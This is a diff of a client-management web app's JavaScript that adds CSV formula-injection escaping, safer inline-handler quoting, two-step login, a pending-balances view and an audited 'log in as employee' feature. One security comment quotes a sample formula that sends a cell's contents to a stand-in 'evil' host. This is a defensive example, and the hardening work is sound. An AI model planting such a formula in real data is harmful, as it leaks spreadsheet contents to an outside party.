@@ -1751,7 +4072,7 @@ async function loadData(){
       if(out.stageReminders) stageRemCfg = out.stageReminders;
       $("memWarn").style.display = "none";
       lastLoadOk = true;
-      return;
+      return true;
     }catch(e){
       if(i === attempts-1){
         $("memWarn").textContent = (e && e.message) || "Can't connect to the server. Please try again in a moment.";
@@ -1791,6 +4112,15 @@ function digitsOnlyInput(el, maxLen){
   el.value = el.value.replace(/\D/g,"").slice(0, maxLen||10);
 }
 function esc(s){ return String(s==null?"":s).replace(/[&<>"']/g, m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[m])); }
+// SECURITY (review fix #12): a CSV cell that starts with = + - @ (or a tab / CR) is run as a
+// formula when the file is opened in Excel or Google Sheets, so a client name such as
+// =HYPERLINK("http://evil/?"&A1,"Click") would execute. Such cells get a leading apostrophe,
+// which spreadsheets show as plain text. Plain negative numbers (-2500) are left alone.
+function csvCell(v){
+  let s = String(v==null?"":v);
+  if(/^[=+@\t\r]/.test(s) || (/^-/.test(s) && !/^-\d+(\.\d+)?$/.test(s))) s = "'" + s;
+  return '"' + s.replace(/"/g,'""') + '"';
+}
 // SECURITY (stored XSS): esc() is correct for HTML *text*, but it is NOT safe for
 // embedding a value inside a JavaScript string that lives in an inline handler
 // attribute, e.g. onclick="openChat(${jsq(name)})". The HTML parser decodes
@@ -2271,7 +4601,7 @@ async function submitEmpReset(){
   const p1 = $("ef_pwd1").value, p2 = $("ef_pwd2").value;
   if(!empUid){ err.textContent = "Enter your employee ID."; return; }
   if(!code){ err.textContent = "Enter the reset code from the email."; return; }
-  if(p1.length < 8){ err.textContent = "Choose a password at least 8 characters long."; return; }
+  if(p1.length < 10){ err.textContent = "Choose a password at least 10 characters long."; return; }
   if(p1 !== p2){ err.textContent = "Passwords don't match."; return; }
   err.textContent = "Saving...";
   $("efResetBtn").disabled = true;
@@ -2366,9 +4696,17 @@ async function doLogin(){
   loginBusy = true;
   err.textContent = "Signing in...";
   try{
-    const out = await api("login", {role:selectedRole, password:$("pwd").value,
+    let out = await api("login", {role:selectedRole, password:$("pwd").value,
       clientKey:$("clientKey").value.trim(), empUid:$("empUid").value.trim(),
       captchaId:usedCaptchaId, captchaAnswer});
+    if(out.otpRequired){
+      // Admin / department login with two-step sign-in: the password was right, now the code.
+      err.textContent = "Enter the code from your authenticator app...";
+      const fin = await askLoginOtp(out);
+      if(!fin) throw new Error("Sign-in cancelled. Sign in again to get a new code.");
+      if(fin.otpJustEnabled) setTimeout(()=>toast("Two-step sign-in is now on for this login."), 800);
+      out = fin;
+    }
     csrfToken = out.csrfToken || "";
     setTabToken(out.sessionToken || "");
     if(selectedRole === "client") clientSelf = out.clientId;
@@ -2422,6 +4760,17 @@ async function restoreSession(){
       history.replaceState(null, "", u.pathname + (u.search || "") + u.hash);
     }
   }catch(e){}
+  // "Log in as this employee": a one-time ticket in the URL fragment (never sent to the
+  // server in the URL or kept in history) is traded for this tab's own employee session.
+  try{
+    const m = /[#&]loginas=([^&]+)/.exec(location.hash || "");
+    if(m){
+      const u2 = new URL(location.href); u2.searchParams.delete("la");
+      history.replaceState(null, "", u2.pathname + (u2.search || ""));
+      const out = await api("redeem_employee_login", {ticket: decodeURIComponent(m[1])});
+      if(out && out.sessionToken) setTabToken(out.sessionToken);
+    }
+  }catch(e){ try{ toast(e.message || "That login link didn't work"); }catch(_){} }
   if(!getTabToken()) return false;
   // A page refresh fires this the instant the page loads — sometimes before the
   // connection is fully warmed up, over a slightly slower network than usual, or
@@ -2452,6 +4801,7 @@ async function restoreSession(){
   empRole = out.empRole || null; empTeamType = out.empTeamType || "";
   $("loginView").style.display = "none";
   $("appView").style.display = "block";
+  if(out.impersonatedBy) showLoginAsBar(out.impersonatedBy, out.impersonationMinutes);
   return true;
 }
 function logout(){
@@ -2517,9 +4867,10 @@ function employeeRenderFn(){
   if(empRole==='JOURNAL_EMPLOYEE') return renderJournalEmployee;
   return renderProgrammer;
 }
-async function refresh(){
+async function refresh(opts){
   if(role==="validator"){ await refreshValidator(); return; }
-  await loadData();
+  const changed = await loadData(opts);
+  if(opts && opts.allowSkip && changed === false) return;   // nothing new: keep the page as it is
   if(needsValidationData()) await loadValidationData();
   $("rolePill").textContent = roleTitle();
   $("whoAmI").textContent = "Signed in as " + roleTitle();
@@ -2977,6 +5328,84 @@ function tcClientRow(c, actionsHtml, extraHtml){
     ${actionsHtml?`<div onclick="event.stopPropagation()" style="display:flex;gap:8px;flex-wrap:wrap">${actionsHtml}</div>`:""}
   </div>`;
 }
+/* ---------- BDC: clients with a pending balance ----------
+   Lists every client (not rejected) whose agreed total is not fully paid yet:
+   client name, BDC who added them, Total / Paid / Pending — biggest balance first.
+   Uses the same clientPaymentPlan() as the rest of the app, so the numbers match the
+   client row, the drawer and the client portal.
+   Who sees what:
+     - shared BDC login        -> every lead it receives, with a "BDC" filter
+     - individual BDC Login    -> only their own leads (the server sends payment data
+                                  for those only; other clients have no money and are
+                                  skipped by clientMoneyVisible()). */
+let tcDueBdcFilter = "";
+function tcMoney(n){ return "Rs. " + Math.round(Number(n)||0).toLocaleString("en-IN"); }
+// Who added / owns this lead: the BDC field, else whoever created it (first NEW step).
+function tcClientBdcName(c){
+  if(c.bdc && String(c.bdc).trim()) return String(c.bdc).trim();
+  const steps = (c.history && c.history.length ? c.history : (c.stageTimes||[]))
+    .filter(h=>h.stage==='NEW' && h.actor);
+  if(steps.length){
+    // history arrives newest-first; the creator is the oldest NEW entry
+    steps.sort((a,b)=> new Date(a.at||0) - new Date(b.at||0));
+    return String(steps[0].actor).trim();
+  }
+  return (role==="employee" && empName) ? empName : "";
+}
+function tcPendingBalanceRows(){
+  return clients
+    .filter(c=>!c.rejected && clientMoneyVisible(c))
+    .map(c=>({c, plan: clientPaymentPlan(c), bdc: tcClientBdcName(c)}))
+    .filter(r=>r.plan.due >= 0.5)
+    .sort((a,b)=> b.plan.due - a.plan.due);
+}
+function tcPendingBalancesHtml(){
+  const all = tcPendingBalanceRows();
+  const showBdc = role !== "employee";          // individual BDC: all rows are theirs
+  const bdcs = [...new Set(all.map(r=>r.bdc).filter(Boolean))].sort((a,b)=>a.localeCompare(b));
+  if(tcDueBdcFilter && !bdcs.includes(tcDueBdcFilter) && tcDueBdcFilter!=="__none") tcDueBdcFilter = "";
+  const rows = all
+    .filter(r=>matchesSearch(r.c))
+    .filter(r=>!showBdc || !tcDueBdcFilter || (tcDueBdcFilter==="__none" ? !r.bdc : r.bdc===tcDueBdcFilter));
+  const sum = rows.reduce((s,r)=>({total:s.total+r.plan.total, paid:s.paid+r.plan.paidAmt, due:s.due+r.plan.due}),
+                         {total:0, paid:0, due:0});
+  const filterHtml = (showBdc && bdcs.length) ? `<select onchange="tcDueBdcFilter=this.value;rerenderCurrent()" style="width:auto;min-width:200px;max-width:260px;flex:0 0 auto;padding:6px 10px">
+      <option value="">All BDCs</option>
+      ${bdcs.map(b=>`<option value="${esc(b)}" ${tcDueBdcFilter===b?"selected":""}>${esc(b)}</option>`).join("")}
+      ${all.some(r=>!r.bdc)?`<option value="__none" ${tcDueBdcFilter==="__none"?"selected":""}>No BDC set</option>`:""}
+    </select>` : "";
+  const summary = `<div style="display:flex;flex-wrap:wrap;gap:8px 22px;align-items:center;justify-content:space-between;margin-bottom:12px">
+      <div style="font-size:13px;display:flex;flex-wrap:wrap;gap:6px 18px">
+        <span>Clients: <b>${rows.length}</b></span>
+        <span>Total: <b>${tcMoney(sum.total)}</b></span>
+        <span>Paid: <b style="color:#0E7A4F">${tcMoney(sum.paid)}</b></span>
+        <span>Pending: <b style="color:#B42318">${tcMoney(sum.due)}</b></span>
+      </div>${filterHtml}
+    </div>`;
+  const body = rows.length ? `<div class="adm-table-wrap"><table class="adm-table">
+      <thead><tr>
+        <th>#</th><th>Client</th>${showBdc?"<th>BDC</th>":""}<th>Stage</th>
+        <th style="text-align:right">Total</th><th style="text-align:right">Paid</th>
+        <th style="text-align:right">Pending</th><th>Installments</th>
+      </tr></thead>
+      <tbody>${rows.map((r,i)=>`<tr onclick="openDrawer(${jsq(r.c.id)})" title="Open client">
+        <td style="color:var(--muted)">${i+1}</td>
+        <td><b>${esc(r.c.name)}</b><div style="font-size:11.5px;color:var(--muted)">${esc(r.c.displayId||r.c.id)}${r.c.phone?" &bull; "+esc(r.c.phone):""}</div></td>
+        ${showBdc?`<td>${esc(r.bdc||"—")}</td>`:""}
+        <td><span class="stage-chip ${chipClass(r.c.stage)}">${STAGE_LABEL[r.c.stage]||esc(r.c.stage)}</span></td>
+        <td style="text-align:right;white-space:nowrap">${tcMoney(r.plan.total)}</td>
+        <td style="text-align:right;white-space:nowrap;color:#0E7A4F">${tcMoney(r.plan.paidAmt)}</td>
+        <td style="text-align:right;white-space:nowrap;color:#B42318;font-weight:700">${tcMoney(r.plan.due)}</td>
+        <td><span class="badge b-dim">${r.plan.paidCount}/${r.plan.count} paid</span></td>
+      </tr>`).join("")}</tbody>
+    </table></div>` : "";
+  const emptyMsg = (searchQuery.trim()||searchStage||tcDueBdcFilter)
+    ? "No client with a pending balance matches your search."
+    : "No pending balances — every client is paid up.";
+  if(!all.length) return tcPanel("Clients with pending balance", 0, "", emptyMsg);
+  return tcPanel("Clients with pending balance", rows.length,
+    summary + (body || `<div class="adm-empty">${esc(emptyMsg)}</div>`), emptyMsg);
+}
 function renderTelecaller(){
   const item = TC_NAV_ITEMS.find(x=>x.key===tcView) || TC_NAV_ITEMS[0];
   const subs = {
@@ -2995,12 +5424,20 @@ function renderTelecaller(){
   const active = clients.filter(c=>!c.rejected);
   const inMkt = active.filter(c=>stageIdx(c.stage)<=2).length;
   const done = active.filter(c=>c.stage==='COMPLETED').length;
+  const dues = tcPendingBalanceRows();
+  const dueTotal = dues.reduce((s,r)=>s + r.plan.due, 0);
   $("statsRow").innerHTML = "";
   const kpiHtml = `<div class="adm-kpi-grid">
     <div class="adm-kpi"><h4>Active Clients</h4><div class="frac">${active.length}</div></div>
     <div class="adm-kpi"><h4>In Marketing Pipeline</h4><div class="frac">${inMkt}</div></div>
     <div class="adm-kpi"><h4>With Accounts / Technical</h4><div class="frac">${active.length-inMkt-done}</div></div>
     <div class="adm-kpi"><h4>Completed</h4><div class="frac">${done}</div></div>
+    <div class="adm-kpi" style="cursor:pointer" title="Show clients with a pending balance"
+      onclick="tcView='dashboard';tcDashSubTab='dues';rerenderCurrent()">
+      <h4>Pending Balance</h4>
+      <div class="frac" style="color:${dueTotal>=0.5?'#B42318':'var(--text)'}">${tcMoney(dueTotal)}</div>
+      <div class="note">${dues.length} client${dues.length===1?'':'s'} with dues</div>
+    </div>
   </div>`;
   const fns = {
     dashboard:renderTcDashboard, registered:renderTcRegistered, technical:renderTcTechnical,
@@ -3023,9 +5460,12 @@ function renderTcDashboard(){
   let html = `<div class="adm-tabbar" style="margin-bottom:14px">
     <button class="adm-tab ${tcDashSubTab==='mine'?'active':''}" onclick="tcDashSubTab='mine';rerenderCurrent()">My leads — ready to work <span class="badge b-dim">${mine0.length}</span></button>
     <button class="adm-tab ${tcDashSubTab==='pipeline'?'active':''}" onclick="tcDashSubTab='pipeline';rerenderCurrent()">Already in the pipeline <span class="badge b-dim">${rest0.length}</span></button>
+    <button class="adm-tab ${tcDashSubTab==='dues'?'active':''}" onclick="tcDashSubTab='dues';rerenderCurrent()">Pending balances <span class="badge ${tcPendingBalanceRows().length?'b-bad':'b-dim'}">${tcPendingBalanceRows().length}</span></button>
   </div>`;
   html += tcSearchBarHtml();
-  if(tcDashSubTab==='pipeline'){
+  if(tcDashSubTab==='dues'){
+    html += tcPendingBalancesHtml();
+  } else if(tcDashSubTab==='pipeline'){
     const restBody = rest.map(c=>tcClientRow(c,"")).join("");
     html += tcPanel("Already in the pipeline", rest.length, restBody,
       (searchQuery.trim()||searchStage) ? "No clients match your search." : "Clients you send onward appear here.");
@@ -3173,7 +5613,7 @@ function admOpenBulkImport(kind, clientId){
       <h4>Bulk import from a file</h4>
       <div class="import-row">
         <input type="file" id="admImportFile" accept=".xlsx,.csv,.tsv">
-        <button class="btn small" onclick="admSubmitFileImport(${jsq(kind)},'${clientId||""}')">Import file</button>
+        <button class="btn small" onclick="admSubmitFileImport(${jsq(kind)},${jsq(clientId||"")})">Import file</button>
       </div>
       <div id="admImportFileResult"></div>
     </div>
@@ -3182,7 +5622,7 @@ function admOpenBulkImport(kind, clientId){
       <p style="color:var(--muted);font-size:13px">Paste the link to a Google Sheet that's shared as "Anyone with the link can view".</p>
       <div class="import-row">
         <input type="text" id="admImportUrl" placeholder="https://docs.google.com/spreadsheets/d/....">
-        <button class="btn small" onclick="admSubmitUrlImport(${jsq(kind)},'${clientId||""}')">Import from link</button>
+        <button class="btn small" onclick="admSubmitUrlImport(${jsq(kind)},${jsq(clientId||"")})">Import from link</button>
       </div>
       <div id="admImportUrlResult"></div>
     </div>
@@ -3929,7 +6369,7 @@ function owTableHtml(out){
 }
 function owDownloadResult(){
   const out = owState.result; if(!out) return;
-  const q = v=>`"${String(v==null?"":v).replace(/"/g,'""')}"`;
+  const q = v=>csvCell(v);
   const lines = [["Row","Result","Client Name","Phone","Email","Service","Status","Stage","Total Amount","Paid","Pending",
                   "Split-up","Client ID","Project ID","Work No","Notes"].map(q).join(",")];
   out.rows.forEach(r=> lines.push([r.row, r.result, r.name, r.phone, r.email, r.service, r.status, r.stageLabel,
@@ -5364,7 +7804,7 @@ function openEmployeeDrawer(id){
     </div>
     <div class="sec"><h4>Work update timeline</h4>${timelineHtml(timeline)}</div>
     <div class="sec">
-      <button class="btn ghost small" style="color:var(--bad);border-color:rgba(248,113,113,.4)" onclick="deleteEmployee(${e.id},'${esc(e.name).replace(/'/g,"\\'")}')">Delete employee</button>
+      <button class="btn ghost small" style="color:var(--bad);border-color:rgba(248,113,113,.4)" onclick="deleteEmployee(${e.id},${jsq(e.name)})">Delete employee</button>
     </div>`;
   $("overlay").classList.add("open");
   $("drawer").classList.add("open");
@@ -7775,7 +10215,7 @@ function admExportClientsCsv(){
   const lines = [head.join(",")].concat(rows.map(c=>{
     const st = admClientStatus(c);
     return [c.displayId||c.id, c.name, c.domain||c.topic||"", c.serviceKey ? serviceLabel(c) : "", c.email||"", fmtDate(admClientRegDate(c)), c.bdc||"", `${admWorkPosition(c)} of ${admWorksCount(c)}`, st.label]
-      .map(v=>`"${String(v==null?"":v).replace(/"/g,'""')}"`).join(",");
+      .map(v=>csvCell(v)).join(",");
   }));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "matiz-clients.csv"; a.click();
@@ -7999,10 +10439,10 @@ function adminClientsTableHtml(){
       <td><span class="adm-status ${st.cls}">${st.label}</span></td>
       <td onclick="event.stopPropagation()">
         <div class="adm-row-menu">
-          <button class="adm-dots" onclick="admToggleRowMenu(event,'cl-${c.id}')">&#8942;</button>
+          <button class="adm-dots" onclick="admToggleRowMenu(event,${jsq('cl-'+c.id)})">&#8942;</button>
           <div class="adm-row-menu-pop" id="qmenu-cl-${c.id}">
-            <button onclick="admToggleRowMenu(event,'cl-${c.id}');admOpenUpdateProfile(${jsq(c.id)})">Edit</button>
-            ${canDeleteClients() ? `<button class="danger" onclick="admToggleRowMenu(event,'cl-${c.id}');admDeleteClient(${jsq(c.id)})">Delete</button>` : ""}
+            <button onclick="admToggleRowMenu(event,${jsq('cl-'+c.id)});admOpenUpdateProfile(${jsq(c.id)})">Edit</button>
+            ${canDeleteClients() ? `<button class="danger" onclick="admToggleRowMenu(event,${jsq('cl-'+c.id)});admDeleteClient(${jsq(c.id)})">Delete</button>` : ""}
           </div>
         </div>
       </td>
@@ -8102,7 +10542,7 @@ function admExportQueriesCsv(){
     const c = admQueryClient(q) || {};
     return [c.name||"", c.domain||c.topic||"", q.query_text||"", fmtDate(q.query_date),
       q.resolved_on?fmtDate(q.resolved_on):"", q.assigned_to||"", QUERY_STATUS_LABEL[q.status]||q.status, q.reply_text||""]
-      .map(v=>`"${String(v).replace(/"/g,'""')}"`).join(",");
+      .map(v=>csvCell(v)).join(",");
   }));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "matiz-queries.csv"; a.click();
@@ -8367,10 +10807,10 @@ function admNewProjectsTableHtml(scope){
     <td>${admInstallmentsText(c)}</td>
     <td onclick="event.stopPropagation()">
       <div class="adm-row-menu">
-        <button class="adm-dots" onclick="admToggleRowMenu(event,'np-${c.id}')">&#8942;</button>
+        <button class="adm-dots" onclick="admToggleRowMenu(event,${jsq('np-'+c.id)})">&#8942;</button>
         <div class="adm-row-menu-pop" id="qmenu-np-${c.id}">
-          <button onclick="admToggleRowMenu(event,'np-${c.id}');admOpenUpdateProfile(${jsq(c.id)})">Edit</button>
-          ${canDeleteClients() ? `<button class="danger" onclick="admToggleRowMenu(event,'np-${c.id}');admDeleteClient(${jsq(c.id)})">Delete</button>` : ""}
+          <button onclick="admToggleRowMenu(event,${jsq('np-'+c.id)});admOpenUpdateProfile(${jsq(c.id)})">Edit</button>
+          ${canDeleteClients() ? `<button class="danger" onclick="admToggleRowMenu(event,${jsq('np-'+c.id)});admDeleteClient(${jsq(c.id)})">Delete</button>` : ""}
         </div>
       </div>
     </td>
@@ -8464,7 +10904,7 @@ function admExportExtensionsCsv(){
   const list = clients.filter(c=>c.extRequested);
   const head = ["Project","Requested By","Current Deadline","Extension Requested","Reason"];
   const lines = [head.join(",")].concat(list.map(c=>[c.domain||c.topic||c.name, c.extRequestedBy||"", fmtDate(c.deadlineDate), c.extAmount||"", c.extReason||""]
-    .map(v=>`"${String(v).replace(/"/g,'""')}"`).join(",")));
+    .map(v=>csvCell(v)).join(",")));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "matiz-extensions.csv"; a.click();
   toast("Exported "+list.length+" extension requests");
@@ -8475,7 +10915,7 @@ function admExportProjectsCsv(){
   const lines = [head.join(",")].concat(rows.map(c=>[
       c.name, c.domain||c.topic||"", c.serviceKey ? serviceLabel(c) : "", [...(c.assignedProgrammers||[]),...(c.assignedWriters||[])].join("; "),
       fmtDate(admClientRegDate(c)), fmtDate(c.deadlineDate), admTechStatusLabel(c), admPubStatusLabel(c), admInstallmentsText(c)
-    ].map(v=>`"${String(v==null?"":v).replace(/"/g,'""')}"`).join(",")));
+    ].map(v=>csvCell(v)).join(",")));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "matiz-projects.csv"; a.click();
   toast("Exported "+rows.length+" projects");
@@ -8739,7 +11179,7 @@ function admProjActivityTab(c){
   const hist = c.history||[];
   return `<div class="adm-panel"><div class="adm-panel-head"><h3>Activity</h3><span class="badge b-purp">${hist.length}</span></div>
     <div class="adm-panel-body">
-      ${hist.length ? hist.map(h=>`<div class="adm-bar-row"><div class="lbl">${esc(STAGE_LABEL[h.stage]||h.stage)}${h.note?" — "+esc(h.note):""}</div><div style="font-size:11px;color:#8DA39A;white-space:nowrap">${esc(h.actor)} · ${fmtDateTime(h.at)}</div></div>`).join("")
+      ${hist.length ? hist.map(h=>`<div class="adm-bar-row"><div class="lbl">${esc(STAGE_LABEL[h.stage]||h.stage)}${h.note?" — "+esc(h.note):""}</div><div style="font-size:11px;color:#8DA39A;white-space:nowrap">${esc(h.actor)}${h.via?" (via "+esc(h.via)+")":""} · ${fmtDateTime(h.at)}</div></div>`).join("")
         : `<div class="adm-empty">No activity recorded yet.</div>`}
     </div>
   </div>`;
@@ -9592,14 +12032,14 @@ function admExportProfileNotesCsv(clientId){
   const notes = clientNotesV2.filter(n=>n.client_id===clientId);
   const head = ["Note Title","Note Description","Created On"];
   const lines = [head.join(",")].concat(notes.map(n=>[n.title,n.description||"",fmtDate(n.created_at)]
-    .map(v=>`"${String(v).replace(/"/g,'""')}"`).join(",")));
+    .map(v=>csvCell(v)).join(",")));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "client-notes.csv"; a.click();
 }
 function admProfileActivityTab(c){
   const hist = c.history||[];
   return `<div class="adm-panel"><div class="adm-panel-head"><h3>Activity</h3><span class="badge b-purp">${hist.length}</span></div>
-    <div class="adm-panel-body">${hist.length ? hist.map(h=>`<div class="adm-bar-row"><div class="lbl">${esc(STAGE_LABEL[h.stage]||h.stage)}${h.note?" — "+esc(h.note):""}</div><div style="font-size:11px;color:#8DA39A;white-space:nowrap">${esc(h.actor)} · ${fmtDateTime(h.at)}</div></div>`).join("")
+    <div class="adm-panel-body">${hist.length ? hist.map(h=>`<div class="adm-bar-row"><div class="lbl">${esc(STAGE_LABEL[h.stage]||h.stage)}${h.note?" — "+esc(h.note):""}</div><div style="font-size:11px;color:#8DA39A;white-space:nowrap">${esc(h.actor)}${h.via?" (via "+esc(h.via)+")":""} · ${fmtDateTime(h.at)}</div></div>`).join("")
       : `<div class="adm-empty">No activity recorded yet.</div>`}</div>
   </div>`;
 }
@@ -9747,7 +12187,7 @@ function admExportPaymentsCsv(){
   const lines = [head.join(",")].concat(rows.map(({c,key,p})=>[
     c.name, c.domain||c.topic||"", PAY_LABELS[key]||key, suggestedAmount(c,key)||0, p.amount||"",
     p.status==='paid'?'Paid':'Pending', p.date?fmtDate(p.date):""
-  ].map(v=>`"${String(v==null?"":v).replace(/"/g,'""')}"`).join(",")));
+  ].map(v=>csvCell(v)).join(",")));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "matiz-payments.csv"; a.click();
   toast("Exported "+rows.length+" payment rows");
@@ -9935,7 +12375,7 @@ function admExportTasksCsv(){
   const lines = [head.join(",")].concat(rows.map(t=>{
     const c = admTaskClient(t);
     return [c?c.name:"", t.title, t.assigned_to||"", t.start_date||"", t.finish_date||"", t.priority, t.status]
-      .map(v=>`"${String(v==null?"":v).replace(/"/g,'""')}"`).join(",");
+      .map(v=>csvCell(v)).join(",");
   }));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "matiz-tasks.csv"; a.click();
@@ -10614,7 +13054,7 @@ function admExportJournalsCsv(){
   const lines = [head.join(",")].concat(list.map(c=>{
     const submittedAt = (c.journalTargets && c.journalTargets[0]) ? c.journalTargets[0].addedAt : "";
     return [c.name,c.displayId||c.id,c.domain||c.topic||"",c.projectId||"",c.journalName,JOURNAL_STATUS_LABEL[c.journalStatus]||"Submitted",submittedAt?fmtDate(submittedAt):""]
-      .map(v=>`"${String(v).replace(/"/g,'""')}"`).join(",");
+      .map(v=>csvCell(v)).join(",");
   }));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "matiz-journals.csv"; a.click();
@@ -10886,7 +13326,7 @@ function admExportTeamCsv(){
   const lines = [head.join(",")].concat(rows.map(e=>[
     e.name, e.empUid, e.branch, EMP_ROLE_LABEL[e.teamType]||EMP_ROLE_LABEL[e.role]||e.role,
     admEmpOngoingProjects(e.name)
-  ].map(v=>`"${String(v==null?"":v).replace(/"/g,'""')}"`).join(",")));
+  ].map(v=>csvCell(v)).join(",")));
   const blob = new Blob([lines.join("\n")], {type:"text/csv"});
   const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "matiz-team.csv"; a.click();
   toast("Exported "+rows.length+" team members");
@@ -11033,7 +13473,7 @@ async function admSaveMember(){
   if(!/^\d{10}$/.test(v("mem_phone"))){ toast("Phone must be 10 digits"); $("mem_phone").focus(); return; }
   if(!/^\d{12}$/.test(v("mem_aadhaar"))){ toast("Aadhaar must be 12 digits"); $("mem_aadhaar").focus(); return; }
   const pwd = v("mem_password");
-  if(pwd && pwd.length < 8){ toast("Password must be at least 8 characters (or leave it blank to generate one)"); return; }
+  if(pwd && pwd.length < 10){ toast("Password must be at least 10 characters (or leave it blank to generate one)"); return; }
   const btn = $("memSaveBtn"); btn.disabled = true; btn.textContent = "Adding...";
   const empRole = v("mem_role"), name = v("mem_name");
   try{
@@ -11058,6 +13498,39 @@ function admOpenTeamProfile(empId){
   rerenderCurrent();
 }
 function admBackFromTeamProfile(){ admTeamPage = "list"; rerenderCurrent(); }
+/* ---------- "Log in as this employee" ----------
+   Super Admin / MD Admin: any employee. Technical / Journal / Marketing Manager: only
+   their own team. The server re-checks all of this; the ticket it hands back works
+   once, for 60 seconds, and only in this browser. */
+const LOGIN_AS_TEAMS = {technical_manager:["PROGRAMMER","PAPER_WRITER"],
+                        journal_manager:["JOURNAL_EMPLOYEE"], marketing_manager:["TELECALLER"]};
+function canLoginAsEmployee(e){
+  if(!e || !e.active) return false;
+  if(role==="super_admin" || role==="md_admin") return true;
+  return (LOGIN_AS_TEAMS[role]||[]).includes(e.role);
+}
+async function loginAsEmployee(id, name){
+  // Open the tab straight away (inside the click) so pop-up blockers allow it.
+  const w = window.open("about:blank", "_blank");
+  let out;
+  try{ out = await api("create_employee_login_link", {targetEmpId:id}); }
+  catch(e){ if(w) w.close(); toast(e.message); return; }
+  // "?la=" forces a real page load in the new tab (a URL that differs only by its
+  // #fragment would not reload); the ticket itself stays in the #fragment.
+  const url = location.origin + location.pathname + "?la=" + Date.now() + "#loginas=" + encodeURIComponent(out.ticket);
+  if(w){ w.opener = null; w.location.replace(url); toast("Opened " + name + "'s dashboard in a new tab"); }
+  else toast("Your browser blocked the new tab — allow pop-ups for this site and try again.");
+}
+function showLoginAsBar(by, minutes){
+  if(!by || $("loginAsBar")) return;
+  const bar = document.createElement("div");
+  bar.id = "loginAsBar";
+  bar.style.cssText = "position:sticky;top:0;z-index:70;background:#B8860B;color:#fff;font-size:13px;font-weight:600;padding:8px 16px;display:flex;gap:12px;align-items:center;justify-content:center;flex-wrap:wrap";
+  bar.innerHTML = `<span>&#128065; You are signed in as <b>${esc(empName||"")}</b> &mdash; opened by ${esc(by)}. Everything done here is recorded as ${esc(empName||"them")} (via ${esc(by)}) and logged for the Super Admin. Their password, e-mail and profile can't be changed from here, and this session ends automatically after ${Number(minutes)||60} minutes.</span>
+    <button class="btn ghost small" style="background:#fff;color:#7a5a00;border-color:#fff" onclick="logout();window.close()">Log out &amp; close</button>`;
+  const app = $("appView"); app.insertBefore(bar, app.firstChild);
+  try{ document.title = (empName||"") + " (login as) — iMatiz"; }catch(_){}
+}
 function renderTeamMemberProfile(){
  try{
   if(!adminDirectory){
@@ -11105,6 +13578,7 @@ function renderTeamMemberProfile(){
     <div class="adm-panel">
       <div class="adm-panel-head"><h3>Dashboard</h3>
         <div style="display:flex;gap:8px">
+          ${canLoginAsEmployee(dirEmp) ? `<button class="btn gold small" title="Opens ${esc(dirEmp.name)}'s dashboard in a new tab, already signed in" onclick="loginAsEmployee(${dirEmp.id},${jsq(dirEmp.name)})">Log in as ${esc(dirEmp.name)} &#8599;</button>` : ""}
           <button class="btn small" onclick="admOpenUpdateMember(${dirEmp.id})">Update</button>
           <button class="btn danger small" onclick="admDeleteMember(${dirEmp.id})">Delete</button>
         </div>
@@ -11910,7 +14384,7 @@ function openDrawer(id){
     <div class="call-item"><b>${esc(cl.type)}</b><span class="when">${fmtDateTime(cl.at)}</span>
     ${cl.note?`<p>${esc(cl.note)}</p>`:""}${cl.next?`<p>Next follow-up: <b style="color:var(--gold)">${fmtDate(cl.next)}</b></p>`:""}</div>`).join("")
     : `<p style="color:var(--muted);font-size:13px">No conversations logged yet.</p>`;
-  const histHtml = c.history.map(h=>`<div class="hist-item"><b>${esc(h.actor)}</b> &rarr; ${STAGE_LABEL[h.stage]||esc(h.stage)}
+  const histHtml = c.history.map(h=>`<div class="hist-item"><b>${esc(h.actor)}</b>${h.via?` <span style="color:var(--muted)">(via ${esc(h.via)})</span>`:""} &rarr; ${STAGE_LABEL[h.stage]||esc(h.stage)}
     ${h.note?`<br><span style="color:var(--muted);font-size:12.5px">${esc(h.note)}</span>`:""}
     <br><small>${fmtDateTime(h.at)}</small></div>`).join("");
   $("drawer").innerHTML = `
@@ -13694,7 +16168,7 @@ function openExtensionModal(clientId, target){
     <div class="field"><label>How much extra time do you need? *</label><select id="ext_amount">${opts}</select></div>
     <div class="field"><label>Reason *</label><textarea id="ext_reason" rows="3" placeholder="e.g. Client added extra requirements midway..."></textarea></div>
     <div class="modal-actions"><button class="btn ghost" onclick="closeModal()">Cancel</button>
-      <button class="btn gold" onclick="submitExtensionRequest(${jsq(clientId)},'${target||""}')">Send request</button></div>`);
+      <button class="btn gold" onclick="submitExtensionRequest(${jsq(clientId)},${jsq(target||"")})">Send request</button></div>`);
 }
 async function submitExtensionRequest(clientId, target){
   const amount = ($("ext_amount")||{}).value || "";
@@ -14186,7 +16660,11 @@ function openSettings(){
     <div style="height:1px;background:var(--line);margin:18px 0"></div>
     <h3>Database Management</h3>
     <p class="msub">Export a backup, upload (restore) a backup, or permanently clear client &amp; project data from the database.</p>
-    <button class="btn ghost" onclick="closeModal();openDatabaseManagement()">&#128451; Open Database Management &#8594;</button>` : "";
+    <button class="btn ghost" onclick="closeModal();openDatabaseManagement()">&#128451; Open Database Management &#8594;</button>
+    <div style="height:1px;background:var(--line);margin:18px 0"></div>
+    <h3>&ldquo;Log in as&rdquo; activity</h3>
+    <p class="msub">Every time a manager opened a team member's dashboard with &ldquo;Log in as&rdquo;, and everything they did there.</p>
+    <button class="btn ghost" onclick="closeModal();openLoginAsLog()">&#128065; View activity &#8594;</button>` : "";
   openModal(`
     ${myEmailSection}
     ${emailSection}
@@ -14196,7 +16674,9 @@ function openSettings(){
